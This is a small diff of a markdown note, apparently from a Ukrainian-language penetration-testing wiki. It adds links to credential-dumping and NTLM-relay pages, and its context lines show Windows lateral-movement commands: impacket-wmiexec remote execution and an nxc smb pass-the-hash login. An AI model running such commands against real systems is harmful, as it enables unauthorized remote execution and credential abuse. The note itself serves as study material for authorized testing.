@@ -10,4 +10,4 @@ impacket-wmiexec <domain>/<u>:<p>@<IP>
 # pass-the-hash
 nxc smb <IP> -u <u> -H <NTLM>
 ```
-**Зв'язки:** [[DCSync-Tickets]] · [[Pivoting]]
+**Зв'язки:** [[DCSync-Tickets]] · [[Pivoting]] · [[Credential-Dumping]] · [[NTLM-Relay]]
